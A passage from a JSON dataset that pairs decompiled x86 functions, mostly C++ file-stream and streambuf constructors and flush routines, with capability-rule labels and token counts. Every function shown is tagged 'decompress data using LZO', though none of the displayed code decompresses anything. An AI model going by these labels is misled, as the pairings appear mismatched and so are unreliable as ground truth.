        "decompiled_code": "\nvoid __fastcall fcn.00481720(uint *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uchar auStack13 [9];\n    \n    iVar3 = *0x4f59f4;\n    *param_1 = 0x50aad0;\n    iVar2 = param_1[1];\n    if (iVar3 == 0) {\n        iVar3 = *(iVar2 + -4);\n        *(iVar2 + -4) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iVar2 + -4;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar3) {\n        fcn.0049d380();\n        return;\n    }\n    fcn.0046bf60(auStack13);\n    fcn.0049d380();\n    return;\n}\n",
        "token_count": 214
    },
    "00476b70": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00476b70(int32_t *param_1)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t extraout_EDX;\n    int32_t *piVar5;\n    int32_t aiStack240 [5];\n    int32_t *piStack220;\n    uint32_t uStack216;\n    int32_t iStack200;\n    uint32_t uStack196;\n    uint8_t uStack181;\n    int32_t iStack176;\n    uchar auStack156 [4];\n    int32_t iStack152;\n    \n    uStack216 = 1;\n    if (param_1[4] < param_1[5]) {\n        uVar2 = (**(*param_1 + 0x34))();\n        uStack216 = uVar2 & 0xffffff00 | uVar2 != 0xffffffff;\n    }\n    if (*(param_1 + 0x4a) == '\\0') {\n        return uStack216;\n    }\n    if (param_1[0x16] != NULL) {\n        uStack181 = (**(*param_1[0x16] + 0x18))();\n        if (uStack181 != 0) {\n            return uStack216;\n        }\n        if (uStack216 == '\\0') {\n            return uStack216;\n        }\n        do {\n            uVar2 = (**(*param_1[0x16] + 0xc))();\n            if (uVar2 == 2) goto code_r0x00476c20;\n            if ((1 < uVar2) || (iStack152 - auStack156 < 1)) break;\n            iVar3 = fcn.00470cc0();\n            if (iStack176 != iVar3) goto code_r0x00476c20;\n        } while (uVar2 == 1);\n        iVar3 = (**(*param_1 + 0x34))();\n        uStack181 = iVar3 != -1;\ncode_r0x00476c20:\n        return uStack181;\n    }\n    fcn.0049e780();\n    piStack220 = param_1;\n    if (*(extraout_ECX + 0x58) == NULL) goto code_r0x00476dcf;\n    cVar1 = (**(**(extraout_ECX + 0x58) + 0x18))();\n    if (cVar1 == '\\0') {\n        (**(**(extraout_ECX + 0x58) + 0x20))();\n        fcn.00418950();\n        piVar5 = aiStack240 + 1;\n        uVar2 = (**(**(extraout_ECX + 0x58) + 8))\n                          (extraout_ECX + 0x38, iStack200, iStack200 + uStack196, piVar5, aiStack240, \n                           extraout_EDX + aiStack240, aiStack240);\n        if (uVar2 < 2) {\n            uStack196 = aiStack240[0] - aiStack240;\n            iVar3 = aiStack240[0];\n            uVar4 = fcn.00470cc0(aiStack240, uStack196);\n            if ((uStack196 != uVar4) || ((uVar2 & 1) == 0)) goto code_r0x00476d1e;\n            iVar3 = (**(**(extraout_ECX + 0x58) + 8))\n                              (piVar5, aiStack240[1], *(extraout_ECX + 0x14), aiStack240 + 1, aiStack240, iVar3, \n                               aiStack240);\n            if (iVar3 != 2) {\n                uVar4 = aiStack240[0] - aiStack240;\n                uVar2 = fcn.00470cc0(aiStack240, uVar4);\n                return uVar2 & 0xffffff00 | uVar2 == uVar4;\n            }\n        }\n        else if (uVar2 == 3) goto code_r0x00476d09;\n        fcn.0049e910(\"basic_filebuf::_M_convert_to_external conversion error\");\ncode_r0x00476dcf:\n        fcn.0049e780();\n        if (*(extraout_ECX_00 + 0x48) != '\\0') {\n            if (*(extraout_ECX_00 + 0x40) != 0) {\n                fcn.004a34b0(*(extraout_ECX_00 + 0x40));\n            }\n            *(extraout_ECX_00 + 0x40) = 0;\n            *(extraout_ECX_00 + 0x48) = 0;\n        }\n        uVar2 = *(extraout_ECX_00 + 0x5c);\n        if (uVar2 != 0) {\n            uVar2 = fcn.004a34b0(uVar2);\n        }\n        *(extraout_ECX_00 + 0x5c) = 0;\n        *(extraout_ECX_00 + 0x60) = 0;\n        *(extraout_ECX_00 + 100) = 0;\n        *(extraout_ECX_00 + 0x68) = 0;\n        return uVar2;\n    }\ncode_r0x00476d09:\n    uVar4 = fcn.00470cc0(iStack200, uStack196);\ncode_r0x00476d1e:\n    return uVar4 & 0xffffff00 | uVar4 == uStack196;\n}\n",
        "token_count": 1250
    },
    "00478340": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00478340(uint *param_1, int32_t param_2)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    \n    fcn.004863a0(param_2);\n    param_1[9] = 0;\n    uVar2 = *(param_2 + 0x28);\n    *param_1 = 0x50a988;\n    param_1[10] = uVar2;\n    uVar1 = *(param_2 + 0x2c);\n    param_1[8] = 0;\n    *(param_1 + 0xb) = uVar1;\n    uVar2 = *(param_2 + 0x30);\n    *(param_2 + 0x28) = 0;\n    *(param_2 + 0x2c) = 0;\n    *(param_2 + 0x30) = 0;\n    param_1[0xc] = uVar2;\n    param_1[0xd] = *(param_2 + 0x34);\n    param_1[0xe] = *(param_2 + 0x38);\n    param_1[0xf] = *(param_2 + 0x3c);\n    uVar2 = *(param_2 + 0x40);\n    *(param_2 + 0x40) = 0;\n    param_1[0x10] = uVar2;\n    uVar2 = *(param_2 + 0x44);\n    *(param_2 + 0x44) = 1;\n    param_1[0x11] = uVar2;\n    uVar1 = *(param_2 + 0x48);\n    *(param_2 + 0x48) = 0;\n    *(param_1 + 0x12) = uVar1;\n    uVar1 = *(param_2 + 0x49);\n    *(param_2 + 0x49) = 0;\n    *(param_1 + 0x49) = uVar1;\n    uVar1 = *(param_2 + 0x4a);\n    *(param_2 + 0x4a) = 0;\n    *(param_1 + 0x4a) = uVar1;\n    *(param_1 + 0x4b) = *(param_2 + 0x4b);\n    uVar2 = *(param_2 + 0x4c);\n    *(param_2 + 0x4c) = 0;\n    param_1[0x13] = uVar2;\n    uVar2 = *(param_2 + 0x50);\n    *(param_2 + 0x50) = 0;\n    param_1[0x14] = uVar2;\n    uVar1 = *(param_2 + 0x54);\n    *(param_2 + 0x54) = 0;\n    *(param_1 + 0x15) = uVar1;\n    param_1[0x16] = *(param_2 + 0x58);\n    uVar2 = *(param_2 + 0x5c);\n    *(param_2 + 0x5c) = 0;\n    param_1[0x17] = uVar2;\n    uVar2 = *(param_2 + 0x60);\n    *(param_2 + 0x60) = 0;\n    param_1[0x18] = uVar2;\n    uVar2 = *(param_2 + 100);\n    *(param_2 + 100) = 0;\n    param_1[0x19] = uVar2;\n    uVar2 = *(param_2 + 0x68);\n    *(param_2 + 0x68) = 0;\n    param_1[0x1a] = uVar2;\n    uVar2 = *(param_2 + 0x40);\n    *(param_2 + 0x14) = 0;\n    *(param_2 + 4) = uVar2;\n    *(param_2 + 8) = uVar2;\n    *(param_2 + 0xc) = uVar2;\n    *(param_2 + 0x10) = 0;\n    *(param_2 + 0x18) = 0;\n    *(param_2 + 0x38) = *(param_2 + 0x34);\n    *(param_2 + 0x3c) = *(param_2 + 0x34);\n    return;\n}\n",
        "token_count": 1011
    },
    "00478480": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00478480(code **param_1)\n\n{\n    char cVar1;\n    code *pcVar2;\n    \n    *param_1 = vtable.c_streambufIwSt11char_traitsIwEE.0;\n    param_1[1] = NULL;\n    param_1[2] = NULL;\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[5] = NULL;\n    param_1[6] = NULL;\n    fcn.0048f530();\n    *param_1 = 0x50a988;\n    param_1[8] = NULL;\n    param_1[9] = NULL;\n    fcn.00470ef0(param_1 + 8);\n    param_1[0xc] = NULL;\n    param_1[0xd] = NULL;\n    param_1[0xe] = NULL;\n    param_1[0xf] = NULL;\n    param_1[0x10] = NULL;\n    param_1[0x11] = 0x200;\n    param_1[0x12] = NULL;\n    param_1[0x13] = NULL;\n    param_1[0x14] = NULL;\n    *(param_1 + 0x15) = 0;\n    param_1[0x16] = NULL;\n    param_1[0x17] = NULL;\n    param_1[0x18] = NULL;\n    param_1[0x19] = NULL;\n    param_1[0x1a] = NULL;\n    cVar1 = fcn.0049fbf0(param_1 + 7);\n    if (cVar1 == '\\0') {\n        return;\n    }\n    pcVar2 = fcn.004a0b40(param_1 + 7);\n    param_1[0x16] = pcVar2;\n    return;\n}\n",
        "token_count": 428
    },
    "004786e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004786e0(code **param_1)\n\n{\n    char cVar1;\n    code *pcVar2;\n    \n    *param_1 = vtable.c_streambufIwSt11char_traitsIwEE.0;\n    param_1[1] = NULL;\n    param_1[2] = NULL;\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[5] = NULL;\n    param_1[6] = NULL;\n    fcn.0048f530();\n    *param_1 = 0x50a988;\n    param_1[8] = NULL;\n    param_1[9] = NULL;\n    fcn.00470ef0(param_1 + 8);\n    param_1[0xc] = NULL;\n    param_1[0xd] = NULL;\n    param_1[0xe] = NULL;\n    param_1[0xf] = NULL;\n    param_1[0x10] = NULL;\n    param_1[0x11] = 0x200;\n    param_1[0x12] = NULL;\n    param_1[0x13] = NULL;\n    param_1[0x14] = NULL;\n    *(param_1 + 0x15) = 0;\n    param_1[0x16] = NULL;\n    param_1[0x17] = NULL;\n    param_1[0x18] = NULL;\n    param_1[0x19] = NULL;\n    param_1[0x1a] = NULL;\n    cVar1 = fcn.0049fbf0(param_1 + 7);\n    if (cVar1 == '\\0') {\n        return;\n    }\n    pcVar2 = fcn.004a0b40(param_1 + 7);\n    param_1[0x16] = pcVar2;\n    return;\n}\n",
        "token_count": 429
    },
    "00478b00": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00478b00(int32_t *param_1)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t extraout_EDX;\n    int32_t *piVar6;\n    int32_t aiStack240 [5];\n    int32_t *piStack220;\n    uint32_t uStack216;\n    int32_t iStack200;\n    uint32_t uStack196;\n    uint8_t uStack181;\n    int32_t iStack176;\n    uchar auStack156 [4];\n    int32_t iStack152;\n    \n    uStack216 = 1;\n    if (param_1[4] < param_1[5]) {\n        uVar3 = (**(*param_1 + 0x34))();\n        uStack216 = uVar3 & 0xffffff00 | uVar3 != -1;\n    }\n    if (*(param_1 + 0x4a) == '\\0') {\n        return uStack216;\n    }\n    if (param_1[0x17] != NULL) {\n        uStack181 = (**(*param_1[0x17] + 0x18))();\n        if (uStack181 != 0) {\n            return uStack216;\n        }\n        if (uStack216 == '\\0') {\n            return uStack216;\n        }\n        do {\n            uVar3 = (**(*param_1[0x17] + 0xc))();\n            if (uVar3 == 2) goto code_r0x00478bb0;\n            if ((1 < uVar3) || (iStack152 - auStack156 < 1)) break;\n            iVar4 = fcn.00470cc0();\n            if (iStack176 != iVar4) goto code_r0x00478bb0;\n        } while (uVar3 == 1);\n        iVar2 = (**(*param_1 + 0x34))();\n        uStack181 = iVar2 != -1;\ncode_r0x00478bb0:\n        return uStack181;\n    }\n    fcn.0049e780();\n    piStack220 = param_1;\n    if (*(extraout_ECX + 0x5c) == NULL) goto code_r0x00478d5f;\n    cVar1 = (**(**(extraout_ECX + 0x5c) + 0x18))();\n    if (cVar1 == '\\0') {\n        (**(**(extraout_ECX + 0x5c) + 0x20))();\n        fcn.00418950();\n        piVar6 = aiStack240 + 1;\n        uVar3 = (**(**(extraout_ECX + 0x5c) + 8))\n                          (extraout_ECX + 0x38, iStack200, iStack200 + uStack196 * 2, piVar6, aiStack240, \n                           extraout_EDX + aiStack240, aiStack240);\n        if (uVar3 < 2) {\n            uStack196 = aiStack240[0] - aiStack240;\n            iVar4 = aiStack240[0];\n            uVar5 = fcn.00470cc0(aiStack240, uStack196);\n            if ((uStack196 != uVar5) || ((uVar3 & 1) == 0)) goto code_r0x00478cac;\n            iVar4 = (**(**(extraout_ECX + 0x5c) + 8))\n                              (piVar6, aiStack240[1], *(extraout_ECX + 0x14), aiStack240 + 1, aiStack240, iVar4, \n                               aiStack240);\n            if (iVar4 != 2) {\n                uVar5 = aiStack240[0] - aiStack240;\n                uVar3 = fcn.00470cc0(aiStack240, uVar5);\n                return uVar3 & 0xffffff00 | uVar3 == uVar5;\n            }\n        }\n        else if (uVar3 == 3) goto code_r0x00478c97;\n        fcn.0049e910(\"basic_filebuf::_M_convert_to_external conversion error\");\ncode_r0x00478d5f:\n        fcn.0049e780();\n        if (*(extraout_ECX_00 + 0x48) != '\\0') {\n            if (*(extraout_ECX_00 + 0x40) != 0) {\n                fcn.004a34b0(*(extraout_ECX_00 + 0x40));\n            }\n            *(extraout_ECX_00 + 0x40) = 0;\n            *(extraout_ECX_00 + 0x48) = 0;\n        }\n        uVar3 = *(extraout_ECX_00 + 0x60);\n        if (uVar3 != 0) {\n            uVar3 = fcn.004a34b0(uVar3);\n        }\n        *(extraout_ECX_00 + 0x60) = 0;\n        *(extraout_ECX_00 + 100) = 0;\n        *(extraout_ECX_00 + 0x68) = 0;\n        *(extraout_ECX_00 + 0x6c) = 0;\n        return uVar3;\n    }\ncode_r0x00478c97:\n    uVar5 = fcn.00470cc0(iStack200, uStack196);\ncode_r0x00478cac:\n    return uVar5 & 0xffffff00 | uVar5 == uStack196;\n}\n",
        "token_count": 1261
    },
    "0047a310": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0047a310(uint *param_1, int32_t param_2)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    \n    fcn.00486d40(param_2);\n    param_1[9] = 0;\n    uVar2 = *(param_2 + 0x28);\n    *param_1 = 0x50a9c8;\n    param_1[10] = uVar2;\n    uVar1 = *(param_2 + 0x2c);\n    param_1[8] = 0;\n    *(param_1 + 0xb) = uVar1;\n    uVar2 = *(param_2 + 0x30);\n    *(param_2 + 0x28) = 0;\n    *(param_2 + 0x2c) = 0;\n    *(param_2 + 0x30) = 0;\n    param_1[0xc] = uVar2;\n    param_1[0xd] = *(param_2 + 0x34);\n    param_1[0xe] = *(param_2 + 0x38);\n    param_1[0xf] = *(param_2 + 0x3c);\n    uVar2 = *(param_2 + 0x40);\n    *(param_2 + 0x40) = 0;\n    param_1[0x10] = uVar2;\n    uVar2 = *(param_2 + 0x44);\n    *(param_2 + 0x44) = 1;\n    param_1[0x11] = uVar2;\n    uVar1 = *(param_2 + 0x48);\n    *(param_2 + 0x48) = 0;\n    *(param_1 + 0x12) = uVar1;\n    uVar1 = *(param_2 + 0x49);\n    *(param_2 + 0x49) = 0;\n    *(param_1 + 0x49) = uVar1;\n    uVar1 = *(param_2 + 0x4a);\n    *(param_2 + 0x4a) = 0;\n    *(param_1 + 0x4a) = uVar1;\n    *(param_1 + 0x13) = *(param_2 + 0x4c);\n    uVar2 = *(param_2 + 0x50);\n    *(param_2 + 0x50) = 0;\n    param_1[0x14] = uVar2;\n    uVar2 = *(param_2 + 0x54);\n    *(param_2 + 0x54) = 0;\n    param_1[0x15] = uVar2;\n    uVar1 = *(param_2 + 0x58);\n    *(param_2 + 0x58) = 0;\n    *(param_1 + 0x16) = uVar1;\n    param_1[0x17] = *(param_2 + 0x5c);\n    uVar2 = *(param_2 + 0x60);\n    *(param_2 + 0x60) = 0;\n    param_1[0x18] = uVar2;\n    uVar2 = *(param_2 + 100);\n    *(param_2 + 100) = 0;\n    param_1[0x19] = uVar2;\n    uVar2 = *(param_2 + 0x68);\n    *(param_2 + 0x68) = 0;\n    param_1[0x1a] = uVar2;\n    uVar2 = *(param_2 + 0x6c);\n    *(param_2 + 0x6c) = 0;\n    param_1[0x1b] = uVar2;\n    uVar2 = *(param_2 + 0x40);\n    *(param_2 + 0x14) = 0;\n    *(param_2 + 4) = uVar2;\n    *(param_2 + 8) = uVar2;\n    *(param_2 + 0xc) = uVar2;\n    *(param_2 + 0x10) = 0;\n    *(param_2 + 0x18) = 0;\n    *(param_2 + 0x38) = *(param_2 + 0x34);\n    *(param_2 + 0x3c) = *(param_2 + 0x34);\n    return;\n}\n",
        "token_count": 1013
    },
    "0047a450": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047a450(code **param_1)\n\n{\n    char cVar1;\n    code *pcVar2;\n    \n    *param_1 = vtable.ages_bynameIcE.0;\n    param_1[1] = NULL;\n    param_1[2] = NULL;\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[5] = NULL;\n    param_1[6] = NULL;\n    fcn.0048f530();\n    *param_1 = 0x50a9c8;\n    param_1[8] = NULL;\n    param_1[9] = NULL;\n    fcn.00470ef0(param_1 + 8);\n    param_1[0xc] = NULL;\n    param_1[0xd] = NULL;\n    param_1[0xe] = NULL;\n    param_1[0xf] = NULL;\n    param_1[0x10] = NULL;\n    param_1[0x11] = 0x200;\n    *(param_1 + 0x12) = 0;\n    *(param_1 + 0x4a) = 0;\n    *(param_1 + 0x13) = 0;\n    param_1[0x14] = NULL;\n    param_1[0x15] = NULL;\n    *(param_1 + 0x16) = 0;\n    param_1[0x17] = NULL;\n    param_1[0x18] = NULL;\n    param_1[0x19] = NULL;\n    param_1[0x1a] = NULL;\n    param_1[0x1b] = NULL;\n    cVar1 = fcn.0049fc40(param_1 + 7);\n    if (cVar1 == '\\0') {\n        return;\n    }\n    pcVar2 = fcn.004a0ba0(param_1 + 7);\n    param_1[0x17] = pcVar2;\n    return;\n}\n",
        "token_count": 460
    },
    "0047a6c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047a6c0(code **param_1)\n\n{\n    char cVar1;\n    code *pcVar2;\n    \n    *param_1 = vtable.ages_bynameIcE.0;\n    param_1[1] = NULL;\n    param_1[2] = NULL;\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[5] = NULL;\n    param_1[6] = NULL;\n    fcn.0048f530();\n    *param_1 = 0x50a9c8;\n    param_1[8] = NULL;\n    param_1[9] = NULL;\n    fcn.00470ef0(param_1 + 8);\n    param_1[0xc] = NULL;\n    param_1[0xd] = NULL;\n    param_1[0xe] = NULL;\n    param_1[0xf] = NULL;\n    param_1[0x10] = NULL;\n    param_1[0x11] = 0x200;\n    *(param_1 + 0x12) = 0;\n    *(param_1 + 0x4a) = 0;\n    *(param_1 + 0x13) = 0;\n    param_1[0x14] = NULL;\n    param_1[0x15] = NULL;\n    *(param_1 + 0x16) = 0;\n    param_1[0x17] = NULL;\n    param_1[0x18] = NULL;\n    param_1[0x19] = NULL;\n    param_1[0x1a] = NULL;\n    param_1[0x1b] = NULL;\n    cVar1 = fcn.0049fc40(param_1 + 7);\n    if (cVar1 == '\\0') {\n        return;\n    }\n    pcVar2 = fcn.004a0ba0(param_1 + 7);\n    param_1[0x17] = pcVar2;\n    return;\n}\n",
        "token_count": 462
    },
    "0047ab60": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0047ab60(int32_t *arg_8h)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    uint *in_ECX;\n    int32_t iVar3;\n    uint var_1ch;\n    uint var_ch;\n    \n    fcn.0049b670();\n    *in_ECX = 0x5067f4;\n    *(in_ECX + 0x3b) = 0;\n    iVar3 = arg_8h[1];\n    in_ECX[0x3a] = 0;\n    in_ECX[1] = iVar3;\n    iVar3 = *arg_8h;\n    in_ECX[0x3c] = 0;\n    iVar3 = *(iVar3 + -0xc);\n    in_ECX[0x3d] = 0;\n    in_ECX[0x3e] = 0;\n    iVar3 = iVar3 + arg_8h;\n    in_ECX[0x1e] = 0x506808;\n    in_ECX[0x3f] = 0;\n    fcn.0049ac60(iVar3);\n    fcn.0049c380(in_ECX + 0x39);\n    uVar2 = *(iVar3 + 0x70);\n    *(iVar3 + 0x70) = 0;\n    in_ECX[0x3a] = uVar2;\n    *(in_ECX + 0x3b) = *(iVar3 + 0x74);\n    uVar1 = *(iVar3 + 0x75);\n    in_ECX[0x3c] = 0;\n    *(in_ECX + 0xed) = uVar1;\n    arg_8h[1] = 0;\n    *in_ECX = 0x50aa0c;\n    in_ECX[0x1e] = 0x50aa34;\n    in_ECX[2] = 0x50aa20;\n    fcn.00478340(arg_8h + 3);\n    in_ECX[0x3c] = in_ECX + 3;\n    return;\n}\n",
        "token_count": 489
    },
    "0047aca0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0047aca0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    fcn.0049b670();\n    *in_ECX = 0x5067f4;\n    in_ECX[0x3a] = 0;\n    *(in_ECX + 0x3b) = 0;\n    in_ECX[0x3c] = 0;\n    in_ECX[0x3d] = 0;\n    in_ECX[0x3e] = 0;\n    in_ECX[0x3f] = 0;\n    in_ECX[0x1e] = 0x506808;\n    in_ECX[1] = 0;\n    fcn.0049c4a0(0);\n    in_ECX[2] = 0x50681c;\n    in_ECX[0x1e] = 0x506830;\n    fcn.0049c4a0(0);\n    *in_ECX = 0x50aa0c;\n    in_ECX[0x1e] = 0x50aa34;\n    in_ECX[2] = 0x50aa20;\n    fcn.00478480();\n    fcn.0049c4a0(in_ECX + 3);\n    iVar1 = fcn.00476e70(arg_8h, arg_ch);\n    if (iVar1 != 0) {\n        fcn.0049c600(0);\n        return;\n    }\n    fcn.0049c600(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 406
    },
    "0047ae00": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0047ae00(uint *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    fcn.0049b670();\n    *in_ECX = 0x5067f4;\n    in_ECX[0x3a] = 0;\n    *(in_ECX + 0x3b) = 0;\n    in_ECX[0x3c] = 0;\n    in_ECX[0x3d] = 0;\n    in_ECX[0x3e] = 0;\n    in_ECX[0x3f] = 0;\n    in_ECX[0x1e] = 0x506808;\n    in_ECX[1] = 0;\n    fcn.0049c4a0(0);\n    in_ECX[2] = 0x50681c;\n    in_ECX[0x1e] = 0x506830;\n    fcn.0049c4a0(0);\n    *in_ECX = 0x50aa0c;\n    in_ECX[0x1e] = 0x50aa34;\n    in_ECX[2] = 0x50aa20;\n    fcn.00478480();\n    fcn.0049c4a0(in_ECX + 3);\n    iVar1 = fcn.00476e70(*arg_8h, arg_ch);\n    if (iVar1 != 0) {\n        fcn.0049c600(0);\n        return;\n    }\n    fcn.0049c600(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 408
    },
    "0047af60": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __fastcall fcn.0047af60(uint *param_1)\n\n{\n    uint var_ch;\n    \n    fcn.0049b670();\n    *param_1 = 0x5067f4;\n    param_1[0x3a] = 0;\n    *(param_1 + 0x3b) = 0;\n    param_1[0x3c] = 0;\n    param_1[0x3d] = 0;\n    param_1[0x3e] = 0;\n    param_1[0x3f] = 0;\n    param_1[0x1e] = 0x506808;\n    param_1[1] = 0;\n    fcn.0049c4a0(0);\n    param_1[2] = 0x50681c;\n    param_1[0x1e] = 0x506830;\n    fcn.0049c4a0(0);\n    *param_1 = 0x50aa0c;\n    param_1[0x1e] = 0x50aa34;\n    param_1[2] = 0x50aa20;\n    fcn.00478480();\n    fcn.0049c4a0(param_1 + 3);\n    return;\n}\n",
        "token_count": 309
    },
    "0047b070": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0047b070(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_ECX;\n    int32_t iVar4;\n    uint var_20h;\n    uint var_1ch;\n    uint var_ch;\n    \n    iVar2 = arg_8h[2];\n    *in_ECX = iVar2;\n    *(in_ECX + *(iVar2 + -0xc)) = arg_8h[3];\n    in_ECX[1] = arg_ch[1];\n    iVar2 = *(iVar2 + -0xc);\n    iVar4 = *(*arg_ch + -0xc) + arg_ch;\n    fcn.0049ac60(iVar4);\n    fcn.0049c380(in_ECX + iVar2 + 0x6c);\n    uVar3 = *(iVar4 + 0x70);\n    *(iVar4 + 0x70) = 0;\n    *(in_ECX + iVar2 + 0x70) = uVar3;\n    *(in_ECX + iVar2 + 0x74) = *(iVar4 + 0x74);\n    uVar1 = *(iVar4 + 0x75);\n    *(in_ECX + iVar2 + 0x78) = 0;\n    *(in_ECX + iVar2 + 0x75) = uVar1;\n    iVar2 = arg_8h[4];\n    arg_ch[1] = 0;\n    in_ECX[2] = iVar2;\n    *(in_ECX + *(iVar2 + -0xc) + 8) = arg_8h[5];\n    iVar2 = arg_8h[1];\n    *in_ECX = iVar2;\n    *(in_ECX + *(iVar2 + -0xc)) = arg_8h[6];\n    in_ECX[2] = arg_8h[7];\n    iVar2 = *arg_8h;\n    *in_ECX = iVar2;\n    *(in_ECX + *(iVar2 + -0xc)) = arg_8h[8];\n    in_ECX[2] = arg_8h[9];\n    fcn.00478340(arg_ch + 3);\n    *(in_ECX + *(*in_ECX + -0xc) + 0x78) = in_ECX + 3;\n    return;\n}\n",
        "token_count": 552
    },
    "0047b1a0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0047b1a0(int32_t *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[2];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    in_ECX[1] = 0;\n    fcn.0049c4a0(0);\n    iVar1 = arg_8h[4];\n    in_ECX[2] = iVar1;\n    *(in_ECX + *(iVar1 + -0xc) + 8) = arg_8h[5];\n    fcn.0049c4a0(0);\n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[6];\n    in_ECX[2] = arg_8h[7];\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[8];\n    in_ECX[2] = arg_8h[9];\n    fcn.00478480();\n    fcn.0049c4a0(in_ECX + 3);\n    iVar1 = fcn.00476e70(arg_ch, arg_10h);\n    if (iVar1 != 0) {\n        fcn.0049c600(0);\n        return;\n    }\n    fcn.0049c600(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 415
    },
    "0047b300": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0047b300(int32_t *arg_8h, uint *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[2];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    in_ECX[1] = 0;\n    fcn.0049c4a0(0);\n    iVar1 = arg_8h[4];\n    in_ECX[2] = iVar1;\n    *(in_ECX + *(iVar1 + -0xc) + 8) = arg_8h[5];\n    fcn.0049c4a0(0);\n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[6];\n    in_ECX[2] = arg_8h[7];\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[8];\n    in_ECX[2] = arg_8h[9];\n    fcn.00478480();\n    fcn.0049c4a0(in_ECX + 3);\n    iVar1 = fcn.00476e70(*arg_ch, arg_10h);\n    if (iVar1 != 0) {\n        fcn.0049c600(0);\n        return;\n    }\n    fcn.0049c600(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 415
    },
    "0047b460": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
